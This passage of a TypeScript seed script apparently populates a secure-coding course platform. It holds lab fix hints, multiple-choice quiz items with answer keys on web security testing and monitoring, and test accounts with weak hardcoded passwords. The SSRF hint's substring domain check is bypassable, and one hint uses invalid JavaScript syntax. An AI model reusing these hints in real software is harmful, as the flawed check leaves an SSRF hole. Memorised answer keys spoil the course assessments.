        "Prevent XSS in API responses using proper encoding",
        "Fix IDOR vulnerabilities with authorization checks",
        "Implement API rate limiting to prevent abuse",
        "Add input validation using schema validation libraries",
        "Integrate security headers using helmet.js",
        "Apply defense-in-depth security principles",
        "Prioritize vulnerabilities by impact and exploitability"
      ],
      hints: [
        "Hint 1: SSRF fix: const allowedDomains = ['alice.com', 'bob.com']; if (!allowedDomains.some(d => webhookUrl.includes(d))) return 403;",
        "Hint 2: XSS fix: Use DOMPurify.sanitize(description) or encode HTML entities before storage",
        "Hint 3: IDOR fix: if (transaction.userId !== req.user.id) return res.status(403).json({ error: 'Forbidden' });",
        "Hint 4: Rate limiting: const rateLimit = require('express-rate-limit'); app.use(rateLimit({ windowMs: 15*60*1000, max: 100 }));",
        "Hint 5: Input validation: const schema = Joi.object({ amount: Joi.number().positive().required() }); schema.validate(req.body);",
        "Hint 6: Security headers: app.use(require('helmet')());",
        "Hint 7: Secrets: const STRIPE_KEY = process.env.STRIPE_API_KEY || throw Error('Missing API key');",
        "SOLUTION: Fix ALL 8+ vulnerabilities using security best practices from Sessions 1-5"
      ]
    },
    quizzes: [
      {
        question: "What is SSRF (Server-Side Request Forgery)?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "A type of SQL injection" },
          { id: "b", text: "When an attacker tricks the server into making requests to internal/unintended systems" },
          { id: "c", text: "Client-side XSS attack" },
          { id: "d", text: "Password brute-forcing" }
        ],
        correctAnswers: ["b"],
        explanation: "SSRF occurs when an attacker can make the server send HTTP requests to arbitrary URLs, potentially accessing internal services (localhost, 192.168.x.x) or cloud metadata endpoints. Prevent with URL allowlisting and validation.",
        category: "Security Testing"
      },
      {
        question: "Which of the following should NEVER be logged in application logs?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Failed login attempts with username" },
          { id: "b", text: "User passwords and API keys" },
          { id: "c", text: "Timestamp and IP address" },
          { id: "d", text: "HTTP status codes" }
        ],
        correctAnswers: ["b"],
        explanation: "Never log passwords, API keys, credit cards, or other sensitive credentials. Log security events (failed logins, authorization failures) but redact sensitive data. Failed logins should log username but never the attempted password.",
        category: "Security Monitoring"
      },
      {
        question: "What is the purpose of rate limiting in API security?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Improve database performance" },
          { id: "b", text: "Prevent brute-force attacks and API abuse" },
          { id: "c", text: "Encrypt API responses" },
          { id: "d", text: "Format JSON responses" }
        ],
        correctAnswers: ["b"],
        explanation: "Rate limiting restricts how many requests a client can make in a time window (e.g., 100 requests per 15 minutes), preventing brute-force attacks, credential stuffing, and API abuse/DDoS.",
        category: "Security Testing"
      },
      {
        question: "Which library is commonly used for rate limiting in Express.js applications?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "express-rate-limit" },
          { id: "b", text: "bcrypt" },
          { id: "c", text: "passport" },
          { id: "d", text: "helmet" }
        ],
        correctAnswers: ["a"],
        explanation: "express-rate-limit is the standard middleware for rate limiting in Express. Usage: app.use(rateLimit({ windowMs: 15*60*1000, max: 100 })) limits to 100 requests per 15 minutes.",
        category: "Security Testing"
      },
      {
        question: "Security monitoring should log all authentication attempts, both successful and failed.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Logging both successful and failed authentication helps detect compromised accounts, brute-force attacks, and suspicious patterns. Include timestamp, IP, username (not password), and outcome (success/failure).",
        category: "Security Monitoring"
      },
      {
        question: "What is penetration testing?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Automated dependency scanning" },
          { id: "b", text: "Simulated cyberattack to identify vulnerabilities before real attackers do" },
          { id: "c", text: "Code review" },
          { id: "d", text: "Static code analysis" }
        ],
        correctAnswers: ["b"],
        explanation: "Penetration testing (pentesting) is ethical hacking where security professionals simulate real attacks to identify vulnerabilities. It complements automated tools by finding logic flaws and complex attack chains.",
        category: "Security Testing"
      },
      {
        question: "What is the OWASP Top 10?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Top 10 programming languages" },
          { id: "b", text: "A list of the 10 most critical web application security risks" },
          { id: "c", text: "Top 10 security tools" },
          { id: "d", text: "Top 10 hackers" }
        ],
        correctAnswers: ["b"],
        explanation: "The OWASP Top 10 is a regularly updated list of the most critical security risks to web applications, including Broken Access Control, Cryptographic Failures, Injection, and others. It's a security awareness guide.",
        category: "Security Testing"
      },
      {
        question: "Which HTTP status code should be returned when rate limiting is exceeded?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "200 OK" },
          { id: "b", text: "401 Unauthorized" },
          { id: "c", text: "429 Too Many Requests" },
          { id: "d", text: "500 Internal Server Error" }
        ],
        correctAnswers: ["c"],
        explanation: "429 Too Many Requests indicates rate limiting. Include a Retry-After header to tell clients when they can retry. This helps legitimate clients understand the issue and adjust their request rate.",
        category: "Security Testing"
      },
      {
        question: "Input validation should only be performed on the server side, not the client side.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["false"],
        explanation: "Input validation should be performed on BOTH sides: client-side for user experience (immediate feedback), and server-side for security (cannot be bypassed). Server-side validation is mandatory; client-side is optional UX enhancement.",
        category: "Security Testing"
      },
      {
        question: "What is a WAF (Web Application Firewall)?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "A database firewall" },
          { id: "b", text: "A firewall that filters HTTP traffic to protect web applications from attacks" },
          { id: "c", text: "A password manager" },
          { id: "d", text: "An encryption protocol" }
        ],
        correctAnswers: ["b"],
        explanation: "WAFs (like Cloudflare, AWS WAF, ModSecurity) sit in front of web applications and filter malicious HTTP traffic, blocking SQL injection, XSS, and other attacks before they reach the application.",
        category: "Security Testing"
      },
      {
        question: "What security events should be included in application logs for effective monitoring?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Only successful operations" },
          { id: "b", text: "Failed logins, authorization failures, data access attempts, admin actions" },
          { id: "c", text: "Only errors and crashes" },
          { id: "d", text: "Every single API request including passwords" }
        ],
        correctAnswers: ["b"],
        explanation: "Security logs should capture authentication failures, authorization denials, privilege escalations, data access/modifications, admin actions, and security-relevant errors. Never log sensitive data like passwords.",
        category: "Security Monitoring"
      },
      {
        question: "What is the purpose of helmet.js in Express applications?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Database encryption" },
          { id: "b", text: "Setting secure HTTP headers automatically" },
          { id: "c", text: "User authentication" },
          { id: "d", text: "Rate limiting" }
        ],
        correctAnswers: ["b"],
        explanation: "helmet.js sets various HTTP security headers (CSP, HSTS, X-Frame-Options, etc.) with sane defaults. Usage: app.use(helmet()) provides instant baseline protection against common web vulnerabilities.",
        category: "Security Testing"
      },
      {
        question: "Centralized logging systems like ELK stack or Splunk help with security monitoring and incident response.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Centralized logging (ELK stack, Splunk, Datadog) aggregates logs from all services, enabling correlation, alerting, and forensic analysis during security incidents. Essential for detecting distributed attacks and investigating breaches.",
        category: "Security Monitoring"
      },
      {
        question: "What is a honeypot in security monitoring?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "A password storage system" },
          { id: "b", text: "A decoy system designed to attract and detect attackers" },
          { id: "c", text: "An encryption algorithm" },
          { id: "d", text: "A type of firewall" }
        ],
        correctAnswers: ["b"],
        explanation: "Honeypots are intentionally vulnerable systems that lure attackers. They have no legitimate use, so any interaction indicates attack activity. They help detect threats, understand attacker techniques, and distract from real systems.",
        category: "Security Monitoring"
      },
      {
        question: "What is the difference between vulnerability scanning and penetration testing?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "They are the same thing" },
          { id: "b", text: "Scanning is automated detection; pentesting is manual exploitation and chaining of vulnerabilities" },
          { id: "c", text: "Scanning is manual; pentesting is automated" },
          { id: "d", text: "Pentesting is only for networks; scanning is for applications" }
        ],
        correctAnswers: ["b"],
        explanation: "Vulnerability scanning (Nessus, OpenVAS) automatically detects known vulnerabilities. Penetration testing involves skilled testers manually exploiting vulnerabilities, chaining attacks, and assessing real-world impact. Both are important.",
        category: "Security Testing"
      },
      {
        question: "API endpoints should implement input validation using schema validation libraries like Joi or Zod.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Schema validation libraries (Joi, Zod, Yup) provide declarative, comprehensive input validation - checking types, formats, ranges, and patterns. This is more reliable and maintainable than manual validation code.",
        category: "Security Testing"
      },
      {
        question: "What is the purpose of security headers like X-Content-Type-Options: nosniff?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Encrypt HTTP traffic" },
          { id: "b", text: "Prevent browsers from MIME-sniffing and executing files as incorrect types" },
          { id: "c", text: "Manage sessions" },
          { id: "d", text: "Hash passwords" }
        ],
        correctAnswers: ["b"],
        explanation: "X-Content-Type-Options: nosniff prevents browsers from MIME-sniffing (guessing file types), which could allow attackers to upload malicious files that browsers execute as JavaScript despite being declared as images.",
        category: "Security Testing"
      },
      {
        question: "Which metric indicates potential brute-force attacks in security monitoring?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Average page load time" },
          { id: "b", text: "High rate of failed login attempts from same IP or for same username" },
          { id: "c", text: "Number of successful API calls" },
          { id: "d", text: "Database query speed" }
        ],
        correctAnswers: ["b"],
        explanation: "Multiple failed login attempts from the same IP address or targeting the same username within a short time indicates brute-force or credential stuffing attacks. Alert and temporarily block after threshold (e.g., 5 failures in 5 minutes).",
        category: "Security Monitoring"
      },
      {
        question: "Security testing should only be performed before initial deployment, not continuously.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["false"],
        explanation: "Security testing must be continuous: automated scans in CI/CD, regular pentests, ongoing monitoring. New vulnerabilities emerge constantly (new CVEs, code changes, configuration drift). Security is a continuous process, not a one-time event.",
        category: "Security Testing"
      },
      {
        question: "What is SIEM (Security Information and Event Management)?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "A programming framework" },
          { id: "b", text: "A system that aggregates and analyzes security logs for threat detection" },
          { id: "c", text: "An encryption standard" },
          { id: "d", text: "A database type" }
        ],
        correctAnswers: ["b"],
        explanation: "SIEM systems (Splunk, ELK, QRadar) collect, correlate, and analyze security logs from multiple sources to detect threats, investigate incidents, and ensure compliance. They provide real-time alerting and forensic capabilities.",
        category: "Security Monitoring"
      },
      {
        question: "What is the principle of 'fail securely' in error handling?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Show detailed error messages to users" },
          { id: "b", text: "Deny access and show generic errors when failures occur, never leak sensitive information" },
          { id: "c", text: "Allow access on errors" },
          { id: "d", text: "Crash the application" }
        ],
        correctAnswers: ["b"],
        explanation: "Fail securely means: on errors, deny access (not grant), show generic error messages to users (not stack traces), log detailed errors server-side only. Never expose system internals through error messages.",
        category: "Security Testing"
      },
      {
        question: "Which tool is commonly used for automated security testing of web applications?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Jest" },
          { id: "b", text: "OWASP ZAP" },
          { id: "c", text: "Prettier" },
          { id: "d", text: "Webpack" }
        ],
        correctAnswers: ["b"],
        explanation: "OWASP ZAP (Zed Attack Proxy) is a free, open-source DAST tool for automated security testing. It crawls applications, fuzzes inputs, and identifies vulnerabilities like XSS, SQL injection, and misconfigurations.",
        category: "Security Testing"
      },
      {
        question: "Anomaly detection in security monitoring can identify unusual patterns that might indicate attacks.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Anomaly detection uses baselines and machine learning to identify unusual behavior - sudden spikes in failed logins, unusual access patterns, requests from new geolocations, abnormal data transfers - which may indicate attacks or compromised accounts.",
        category: "Security Monitoring"
      },
      {
        question: "What is a blue team in cybersecurity?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "The attacking/offensive security team" },
          { id: "b", text: "The defensive security team that protects systems and responds to incidents" },
          { id: "c", text: "Database administrators" },
          { id: "d", text: "Frontend developers" }
        ],
        correctAnswers: ["b"],
        explanation: "Blue team is the defensive security team - monitoring, detecting, and responding to security threats. Red team is offensive (simulating attacks). Purple team combines both to improve overall security posture.",
        category: "Security Monitoring"
      },
      {
        question: "What should an incident response plan include?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Only technical recovery steps" },
          { id: "b", text: "Detection, containment, eradication, recovery, and post-incident analysis procedures" },
          { id: "c", text: "Just contact information" },
          { id: "d", text: "Marketing strategy" }
        ],
        correctAnswers: ["b"],
        explanation: "Incident response plans should cover: preparation, detection/analysis, containment, eradication, recovery, and post-incident review. Include roles, communication plans, escalation procedures, and technical playbooks for common incidents.",
        category: "Security Monitoring"
      }
    ]
  }
];

async function seedDatabase() {
  try {
    await clearDatabase();

    console.log('Starting database seed...');

    const adminHash = await bcrypt.hash('admin123', 10);
    const studentHash = await bcrypt.hash('student123', 10);

    const [admin, student1, student2] = await db.insert(users).values([
      {
        id: 'user-admin',
        email: 'admin@example.com',
        passwordHash: adminHash,
        username: 'Admin User',
        role: 'admin',
        isActive: true,
      },
      {
        id: 'user-student-1',
        email: 'student1@example.com',
        passwordHash: studentHash,
        username: 'Student One',
        role: 'student',
        isActive: true,
      },
      {
        id: 'user-student-2',
        email: 'student2@example.com',
        passwordHash: studentHash,
        username: 'Student Two',
        role: 'student',
        isActive: true,
      },
    ]).returning();

    console.log('✓ Created users');

    for (const topicData of SEED_DATA) {
      const [topic] = await db.insert(topics).values({
        number: topicData.number,
        title: topicData.title,
        duration: topicData.duration,
        description: topicData.description,
        subparts: topicData.subparts,
        pptUrl: `/presentations/topic-${topicData.number}.pptx`,
        pptFileName: `${topicData.title.replace(/[^a-zA-Z0-9]/g, '_')}.pptx`,
        learningOutcomes: topicData.learningOutcomes,
        orderIndex: topicData.number,
      }).returning();

      console.log(`✓ Created topic: ${topic.title}`);

      await db.insert(labExercises).values({
        id: `lab-topic-${topic.id}`,
        topicId: topic.id,
        title: topicData.lab.title,
        description: topicData.lab.description,
        estimatedTime: topicData.lab.estimatedTime,
        instructions: topicData.lab.instructions,
        vulnerableCode: topicData.lab.vulnerableCode,
        correctCode: topicData.lab.correctCode,
        validationCriteria: topicData.lab.validationCriteria,
        learningOutcomes: topicData.lab.learningOutcomes,
        hints: topicData.lab.hints,
      });

      console.log(`  ✓ Created lab for topic ${topic.id}`);

      for (let i = 0; i < topicData.quizzes.length; i++) {
        const quiz = topicData.quizzes[i];
        await db.insert(quizQuestions).values({
          id: `quiz-${topic.id}-${i + 1}`,
          topicId: topic.id,
          question: quiz.question,
          type: quiz.type,
          options: quiz.options,
          correctAnswers: quiz.correctAnswers,
          explanation: quiz.explanation,
          category: quiz.category,
          orderIndex: i + 1,
        });
      }

      console.log(`  ✓ Created 25 quiz questions for topic ${topic.id}`);
    }

    console.log('Database seeded successfully!');
    console.log('\nTest Accounts:');
    console.log('  Admin: admin@example.com / admin123');
    console.log('  Student 1: student1@example.com / student123');
    console.log('  Student 2: student2@example.com / student123');
  } catch (error) {
    console.error('Error seeding database:', error);
    throw error;
  }
}

if (import.meta.url.endsWith(process.argv[1])) {
  seedDatabase()
    .then(() => process.exit(0))
    .catch(() => process.exit(1));
}

export { seedDatabase, clearDatabase };
